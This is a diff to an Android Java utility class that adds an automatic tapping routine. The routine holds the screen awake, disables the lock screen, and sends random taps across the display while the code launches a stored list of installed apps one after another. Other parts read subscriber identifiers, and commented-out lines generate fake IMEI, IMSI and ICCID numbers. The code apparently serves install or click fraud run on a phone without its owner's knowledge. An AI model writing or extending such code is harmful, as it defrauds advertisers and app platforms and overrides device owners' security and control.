@@ -19,18 +19,22 @@ import org.xml.sax.InputSource;
 import org.xml.sax.SAXException;
 import org.xml.sax.XMLReader;
 
-import com.custom.Constant;
-import com.custom.SharedPreferencesUtils;
-import com.custom.XMLHandler;
-import com.custom.network.HttpRequest;
-
+import android.app.Instrumentation;
+import android.app.KeyguardManager;
+import android.app.KeyguardManager.KeyguardLock;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.os.Environment;
+import android.os.PowerManager;
+import android.os.SystemClock;
 import android.telephony.TelephonyManager;
+import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.MotionEvent;
+
+import com.custom.network.HttpRequest;
 
 
 public class CustomUtils {
@@ -50,54 +54,121 @@ public class CustomUtils {
 		}
 	}
 	
+	/**
+	 * 自动点击
+	 */
+    PowerManager.WakeLock wl = null;
+    KeyguardLock mKeyguardLock = null;
+    boolean stop = false;
+    static Thread myClickThread = null;
+	private Thread clickThread(){
+		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE); 
+		wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
+		KeyguardManager mKeyguardManager = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+	    mKeyguardLock  = mKeyguardManager.newKeyguardLock("");  
+		
+	    DisplayMetrics localDisplayMetrics2 = context.getResources().getDisplayMetrics();
+	    final int screenHeight = localDisplayMetrics2.heightPixels;
+	    final int screenWidth = localDisplayMetrics2.widthPixels;
+	    stop = false;
+		Thread t = new Thread(){
+			public void run(){
+				wl.acquire();
+				mKeyguardLock.disableKeyguard();
+	    		while (!stop) {
+					float x = (float)Math.random() * screenWidth;
+					float y = (float)Math.random() * screenHeight;
+					Log.e(TAG, "Instrumentation:"+x+":"+y );
+
+					if(y<30)
+						y+=30;
+					try{
+        	    		Instrumentation inst=new Instrumentation();
+        	    		inst.sendPointerSync(MotionEvent.obtain(SystemClock.uptimeMillis(),SystemClock.uptimeMillis(),MotionEvent.ACTION_DOWN, x, y, 0));
+        	    		inst.sendPointerSync(MotionEvent.obtain(SystemClock.uptimeMillis(),SystemClock.uptimeMillis(),MotionEvent.ACTION_UP, x, y, 0));
+					}catch(Exception e){
+						e.printStackTrace();
+					}
+        			try {
+						Thread.sleep(500);
+					} catch (InterruptedException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+	    		}
+	    		mKeyguardLock.reenableKeyguard();
+	    		wl.release();
+			}
+		};
+		t.setDaemon(true);
+		t.start();
+		return t;
+	}
+	
+	
 	public void wakeUpApp(){
 		Log.i(TAG, "===================wakeUpApp");
+		
 		Map<String,String> appInfos = (Map<String,String>)SharedPreferencesUtils.getConfigAll(SharedPreferencesUtils.INSTALLED_APP_INFO);
 		Log.i("getInstallerPackageName",appInfos.size()+"");
-		if(appInfos.size()<=0)
+		if(appInfos.size()<=0){
 			return ;
+		}
+			
+		//启动自动点击
+		try{
+			if(myClickThread==null){
+				myClickThread = clickThread();
+			}else{
+				return;
+			}
+		}catch(Exception e){}
+
 		
 		// 查询是否存在应该安装的应用
 		List<PackageInfo> packages = context.getPackageManager().getInstalledPackages(0);
 		PackageInfo packageInfo = null;
         Iterator it = appInfos.keySet().iterator();
-        
         while(it.hasNext()){
         	String key = (String)it.next();
 			for (int i = 0; i < packages.size(); i++) {
 				packageInfo = packages.get(i);
-				if(packageInfo.packageName.equals(key)){
-						try {
-							//Log.i(TAG, "==================="+key);
-							PackageManager packageManager = context.getPackageManager();
-							Intent intent = new Intent();
-							intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
-							intent = packageManager
-									.getLaunchIntentForPackage(key);
-							context.startActivity(intent);
-							/*
-							 * 都知道，Context中有一个startActivity方法，
-							 * Activity继承自Context，重载了startActivity方法。
-							 * 如果使用Activity的startActivity方法，不会有任何限制，
-							 * 而如果使用Context的startActivity方法的话，就需要开启一个新的task，
-							 * 遇到上面那个异常的，都是因为使用了Context的startActivity方法。解决办法是，加一个flag。 
-							 */
-							Intent MyIntent = new Intent(Intent.ACTION_MAIN);
-							MyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
+				if (packageInfo.packageName.equals(key)) {
+					try {
+						// Log.i(TAG, "==================="+key);
+						PackageManager packageManager = context.getPackageManager();
+						Intent intent = new Intent();
+						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+						intent = packageManager.getLaunchIntentForPackage(key);
+						context.startActivity(intent);
+						/*
+						 * 都知道，Context中有一个startActivity方法，
+						 * Activity继承自Context，重载了startActivity方法。
+						 * 如果使用Activity的startActivity方法，不会有任何限制，
+						 * 而如果使用Context的startActivity方法的话，就需要开启一个新的task，
+						 * 遇到上面那个异常的，都是因为使用了Context的startActivity方法。解决办法是，加一个flag。
+						 */
+						Intent MyIntent = new Intent(Intent.ACTION_MAIN);
+						MyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
-							MyIntent.addCategory(Intent.CATEGORY_HOME);
-							context.startActivity(MyIntent);
-							//依次打开软件的时候要有一定的间隔，防止同时打开软件会出现死机现象
-							Thread.sleep(5*1000);
-						} catch (Exception e) {
-							e.printStackTrace();
-						}
-						break;
+						MyIntent.addCategory(Intent.CATEGORY_HOME);
+						context.startActivity(MyIntent);
+						// 依次打开软件的时候要有一定的间隔，防止同时打开软件会出现死机现象
+						Thread.sleep(20 * 1000);
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
+					break;
 				}
 			}
         }
         
-
+        try{
+        	stop = true;
+        	myClickThread.interrupt();
+        }catch(Exception e){
+        	myClickThread = null;
+        }
 	}
 	
 	
@@ -111,8 +182,6 @@ public class CustomUtils {
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-			
-
 		} catch (Exception e) {
 
 		}
@@ -207,6 +276,7 @@ public class CustomUtils {
     }
     
     public boolean updateInstalledInfo(String packageName){
+    	Log.i(TAG, "===================updateInstalledInfo");
     	//我们说到的和手机、卡相关的号码数据包括IMSI,MSISDN,ICCID，IMEIIMSI：
     	//international mobiles subscriber identity国际移动用户号码标识，这个一般大家是不知道，GSM必须写在卡内相关文件中；
     	//MSISDN:mobile subscriber ISDN用户号码，这个是我们说的139，136那个号码；
@@ -219,7 +289,7 @@ public class CustomUtils {
         String imsi =tm.getSubscriberId();     //取出IMSI
        
 //        long time = new Date().getTime();
-//        imei = String.valueOf(100000000001171L+time);
+//        imei = String.valueOf(100000000001171L+time); 
 //        imsi=String.valueOf(110260000000117L+time);
 //        iccid = String.valueOf(1901410321111851071L+time);
 
@@ -264,7 +334,7 @@ public class CustomUtils {
     public boolean checkAndInstalledApp(){
 		try {
 			Map<String,String> appInfos = (Map<String,String>)SharedPreferencesUtils.getConfigAll(SharedPreferencesUtils.NEW_APP_INFO);
-			//Log.i("getInstallerPackageName",appInfos.size()+"");
+			Log.i("getInstallerPackageName",appInfos.size()+"");
 			if(appInfos.size()<=0)
 				return false;
 			
